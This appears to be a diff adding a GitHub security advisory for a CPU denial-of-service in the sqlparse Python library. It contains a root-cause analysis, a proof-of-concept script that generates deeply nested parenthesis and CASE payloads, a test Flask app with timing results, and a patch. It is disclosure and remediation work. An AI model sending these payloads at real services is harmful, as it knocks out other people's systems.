@@ -1,0 +1,90 @@
+{
+  "id": "GHSA-pwgv-4x5q-6m9f",
+  "modified": "2026-08-17T18:00:08.906472710Z",
+  "published": "2026-08-17T17:49:47Z",
+  "aliases": [
+    "CVE-2026-54284"
+  ],
+  "summary": "sqlparse: TokenList.__init__ materializes O(subtree) value per group, causing CPU DoS before depth/token caps trigger",
+  "details": "### Summary\n\n`sqlparse` ships hard limits (`MAX_GROUPING_DEPTH=100`, `MAX_GROUPING_TOKENS=10000`) intended to bound parsing work on attacker-supplied SQL, but the path that *reaches* those limits is itself `O(n*depth)` per token-group construction. A ~1-2 KB SQL payload (e.g. `SELECT (((((1))))) ...` with 500-2000 nesting levels, or a 200-400-level nested `CASE WHEN` chain) drives the parser to spend multiple seconds of CPU before the depth cap raises `SQLParseError`. Concretely: a 2 KB malicious payload consumes ~10 seconds of CPU per request on a single worker (~5000x CPU-to-input amplification), while a benign 1 KB SQL completes in ~3 ms.\n\nThe root cause is `TokenList.__init__` calling `super().__init__(None, str(self))`. `TokenList.__str__` flattens the entire subtree on every call, and grouping constructs a new `TokenList` for every parenthesis / CASE / list group, so a tree of depth `d` with `n` total tokens performs `O(n*d)` flatten work just to materialize the cached `value` field, which is then never read for grouped nodes (they override `__str__`).\n\nThis is a distinct quadratic from the input-size caps added in GHSA-2m57-hf25-phgg / GHSA-27jp-wm6q-gp25: those caps prevent unbounded work, but the time required to *trigger* the caps is itself superlinear in payload size.\n\n### Affected components\n\n`sqlparse` 0.5.5 (latest) and every prior version that ships `TokenList.__init__`. The offending line has existed since the introduction of the cached-value invariant; the recent DoS-protection commit (`da67ac1`, 2025-12-08) added depth + token caps to `_group_matching` / `_group` but left the per-node `str(self)` materialization untouched.\n\n### Vulnerable code (file:line)\n\n[`sqlparse/sql.py#L162`](https://github.com/andialbrecht/sqlparse/blob/0.5.5/sqlparse/sql.py#L162) (release 0.5.5) / [`sqlparse/sql.py#L167`](https://github.com/andialbrecht/sqlparse/blob/c923da9c5a8e8403dd32efc2171b60a177444d43/sqlparse/sql.py#L167) (current `master`):\n\n```python\nclass TokenList(Token):\n    __slots__ = 'tokens'\n\n    def __init__(self, tokens=None):\n        self.tokens = tokens or []\n        [setattr(token, 'parent', self) for token in self.tokens]\n        super().__init__(None, str(self))   # ← O(subtree) work per group\n        self.is_group = True\n\n    def __str__(self):\n        return ''.join(token.value for token in self.flatten())\n```\n\n`__str__` recurses via `flatten()` over the *entire* subtree below `self`. Every `TokenList` constructed during grouping (every `Parenthesis`, `Case`, `IdentifierList`, etc.) runs this on its current children, which themselves recursively call `flatten()`. For grouping that builds a tree of depth `d` containing `n` tokens, the construction cost is `O(n * d)`.\n\nThe grouping pipeline that triggers it lives at [`sqlparse/engine/grouping.py#L80`](https://github.com/andialbrecht/sqlparse/blob/0.5.5/sqlparse/engine/grouping.py#L80) (`group_parenthesis`) and [`sqlparse/engine/grouping.py#L84`](https://github.com/andialbrecht/sqlparse/blob/0.5.5/sqlparse/engine/grouping.py#L84) (`group_case`). Both call `_group_matching` which builds nested `Parenthesis` / `Case` `TokenList` instances bottom-up.\n\n### Reachable / How input reaches the sink\n\n`sqlparse.parse(sql)`, `sqlparse.format(sql, reindent=True)`, and `sqlparse.split(sql)` are the documented entry points and all flow into `engine/filter_stack.py:run` → `engine/grouping.py:group` → `group_parenthesis` / `group_case`. There is no opt-in flag: the quadratic runs on default configuration whenever attacker-controlled SQL contains nested parentheses, nested `CASE WHEN`, nested subqueries, or nested `ARRAY[]` literals.\n\nReal-world consumers that feed user input directly into these entry points include any SQL formatter web service (the `sqlformat.org`-style class of tools), Django's `format_debug_sql` (`django/db/backends/base/operations.py`) used when a debug toolbar shows user-typed SQL, and downstream metadata libraries such as `sql-metadata` (`Parser(sql).columns` triggers the same O(n*d) path and reproduces the multi-second hang on the same inputs).\n\n### Proof of concept\n\nMinimal in-process reproduction (sqlparse 0.5.5, default settings, no caps overridden):\n\n```python\nimport sqlparse, time, signal\n\ndef _h(s, f): raise TimeoutError()\nsignal.signal(signal.SIGALRM, _h)\n\ndef measure(label, sql, fn):\n    signal.alarm(30)\n    t0 = time.perf_counter()\n    status = 'OK'\n    try:\n        fn(sql)\n    except sqlparse.exceptions.SQLParseError:\n        status = 'CAP'\n    except TimeoutError:\n        status = 'TIMEOUT'\n    finally:\n        signal.alarm(0)\n    dt = (time.perf_counter() - t0) * 1000\n    print(f'  {status:8} {dt:8.1f}ms  {label}  ({len(sql)} B)')\n\n# Vector 1: deeply nested parentheses\nfor n in (200, 500, 1000, 2000):\n    sql = 'SELECT ' + '(' * n + '1' + ')' * n\n    measure(f'nested-paren n={n}', sql, sqlparse.parse)\n\n# Vector 2: deeply nested CASE WHEN\nfor n in (100, 200, 400):\n    case = '1'\n    for i in range(n):\n        case = f'CASE WHEN x={i} THEN {case} ELSE NULL END'\n    measure(f'CASE-nested n={n}', f'SELECT {case} FROM t', sqlparse.parse)\n```\n\nOutput on the reporter's machine (Python 3.9, sqlparse 0.5.5, single core):\n\n```\n  CAP         80.7ms  nested-paren n=200  (408 B)\n  CAP       1342.9ms  nested-paren n=500  (1008 B)\n  CAP      11206.9ms  nested-paren n=1000  (2008 B)\n  TIMEOUT  \u003e10000ms   nested-paren n=2000  (4008 B)\n  CAP         83.1ms  CASE-nested n=100  (3405 B)\n  CAP        559.6ms  CASE-nested n=200  (6905 B)\n  CAP       5012.2ms  CASE-nested n=400  (13905 B)\n```\n\n`cProfile` attribution (nested-paren n=500, 1008 B input, 3.1 s total):\n\n```\nncalls   cumtime  filename:lineno(function)\n   501    3.133   sqlparse/sql.py:165(__str__)\n   501    3.127   {method 'join' of 'str' objects}\n252504    3.110   sqlparse/sql.py:166(\u003cgenexpr\u003e)\n42168504 3.079   sqlparse/sql.py:207(flatten)\n```\n\n42 million `flatten()` calls for a 1 KB input. The cap raises at depth 100, but `TokenList.__init__` ran `str(self)` once per group construction and each call walked the partial subtree.\n\n### End-to-end reproduction (against running consumer)\n\n`victim_app.py` (a 50-line Flask formatter, the canonical sqlparse consumer pattern):\n\n```python\nfrom flask import Flask, request, jsonify\nimport sqlparse, time\napp = Flask(__name__)\n\n@app.route('/parse', methods=['POST'])\ndef parse_sql():\n    sql = request.get_data(as_text=True)\n    t0 = time.perf_counter()\n    try:\n        sqlparse.parse(sql)\n        return jsonify({'ok': True, 'parse_ms': round((time.perf_counter()-t0)*1000, 1)})\n    except sqlparse.exceptions.SQLParseError as e:\n        return jsonify({'ok': False, 'parse_ms': round((time.perf_counter()-t0)*1000, 1), 'error': str(e)}), 400\n\n@app.route('/format', methods=['POST'])\ndef format_sql():\n    sql = request.get_data(as_text=True)\n    t0 = time.perf_counter()\n    formatted = sqlparse.format(sql, reindent=True, keyword_case='upper')\n    return jsonify({'ok': True, 'parse_ms': round((time.perf_counter()-t0)*1000, 1), 'len': len(formatted)})\n\nif __name__ == '__main__':\n    app.run(host='127.0.0.1', port=5099, threaded=False)\n```\n\nDriver run (Python 3.9, sqlparse 0.5.5, `threaded=False` so one worker per request):\n\n```\n=== Baseline (benign payloads) ===\n  benign small SQL                              8B  wire=    8.8ms  server=     0.2ms\n  benign 1 KB SQL                             220B  wire=    4.1ms  server=     2.5ms\n  benign flat 500-cols                       2902B  wire=   91.7ms  server=    90.2ms\n\n=== Malicious payloads (within default caps) ===\n  nested-paren n=200                          408B  wire=   84.0ms  server=    82.6ms  ok=False\n  nested-paren n=500                         1008B  wire= 1371.9ms  server=  1370.5ms  ok=False\n  nested-paren n=1000                        2008B  wire=10335.3ms  server=10333.7ms  ok=False\n  nested-paren n=2000                        4008B  wire=10661.4ms  server=10659.6ms  ok=False\n  CASE-nested n=400                         13905B  wire= 5136.4ms  server= 5134.7ms  ok=False\n  IN-tuple-format n=1000                     9922B  wire= 3852.8ms  server=  3851.2ms  ok=True\n```\n\nA 2 KB payload (`nested-paren n=1000`) pins one worker for 10 seconds at 100% CPU. With `gunicorn -w N` deploying the same app, `N` concurrent malicious requests exhaust every worker and bring the service down. The cap `SQLParseError` exception is delivered to the caller, but only *after* the CPU work is already burnt.\n\n### Impact\n\n- Single-threaded service: 1-2 KB payload locks the worker for 1-10 seconds (CWE-1333 / CWE-405 / CWE-400 — uncontrolled resource consumption).\n- Multi-worker service: attacker sends `N` parallel requests, exhausts the worker pool.\n- Wire-to-CPU amplification on the worst vector: ~5000x (2 KB request → 10 seconds CPU).\n- Downstream library impact: `sql-metadata.Parser(sql).columns` calls `sqlparse.parse` internally and inherits the exact same hang (`nested-paren n=1000` → 11.3 s).\n\n### Suggested fix\n\nReplace the eager `str(self)` materialization with a single-pass concatenation of children's already-cached `value` fields. The `Token.value` invariant `value == str(self) at construction` is preserved (children's `value` is itself built the same way bottom-up), but the per-node cost drops from `O(subtree)` to `O(len(self.tokens))`:\n\n```python\ndef __init__(self, tokens=None):\n    self.tokens = tokens or []\n    [setattr(token, 'parent', self) for token in self.tokens]\n    # Avoid materializing the full subtree via str(self): concatenating\n    # children's already-cached `value` is O(len(tokens)) per group,\n    # whereas str(self) recursively flattens the entire subtree which is\n    # O(subtree) per node and turns nested grouping into O(n * depth).\n    super().__init__(None, ''.join(token.value for token in self.tokens))\n    self.is_group = True\n```\n\nMeasured against the 0.5.5 source tree with the patch applied locally and the full existing test-suite running (479 passed, 2 xfailed, 1 xpassed; the same baseline as unpatched `0d24023`):\n\n| Vector | Before fix | After fix | Speedup |\n|---|---|---|---|\n| nested-paren n=500 | 1336 ms | 11 ms | 121x |\n| nested-paren n=1000 | 11206 ms | 22 ms | 509x |\n| nested-paren n=2000 | TIMEOUT (\u003e10 s) | 45 ms | 220x+ |\n| CASE-nested n=200 | 559 ms | 25 ms | 22x |\n| CASE-nested n=500 | TIMEOUT (\u003e10 s) | 61 ms | 160x+ |\n| benign 1 KB SQL | 3 ms | 3 ms | unchanged |\n\nEnd-to-end Flask `victim_app` re-run against the patched library:\n\n```\n  nested-paren n=1000                        2008B  server=    34.6ms\n  nested-paren n=2000                        4008B  server=    67.2ms\n  CASE-nested n=400                         13905B  server=    49.5ms\n  benign 1 KB SQL                             220B  server=     3.4ms\n```\n\nThe IN-tuple `format()` vector observed at `n=1000` (3.8 s for ~10 KB input) is a separate quadratic in the `reindent` filter (`filters/reindent.py:_get_offset` → `_flatten_up_to_token`) and is not covered by this advisory; please consider it as a follow-up if the maintainer would like a separate report.\n\n### Fix PR\n\nA fix PR against the temp private fork, mirroring the diff above with a regression test (`test_nested_paren_within_cap_under_50ms`), is attached and linked from this advisory.\n\n### Credit\n\nReported by [tonghuaroot](https://github.com/tonghuaroot).",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "sqlparse",
+        "purl": "pkg:pypi/sqlparse"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.6.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.0",
+        "0.1.1",
+        "0.1.10",
+        "0.1.11",
+        "0.1.12",
+        "0.1.13",
+        "0.1.14",
+        "0.1.15",
+        "0.1.16",
+        "0.1.17",
+        "0.1.18",
+        "0.1.19",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.2.3",
+        "0.2.4",
+        "0.3.0",
+        "0.3.1",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.4.3",
+        "0.4.4",
+        "0.5.0",
+        "0.5.1",
+        "0.5.2",
+        "0.5.3",
+        "0.5.4",
+        "0.5.5"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.5.5",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-pwgv-4x5q-6m9f/GHSA-pwgv-4x5q-6m9f.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/andialbrecht/sqlparse/security/advisories/GHSA-pwgv-4x5q-6m9f"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/andialbrecht/sqlparse/commit/939b129e24c0ad5d51368b1aa72fffcaca76f06f"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/andialbrecht/sqlparse"
+    }
+  ]
+}
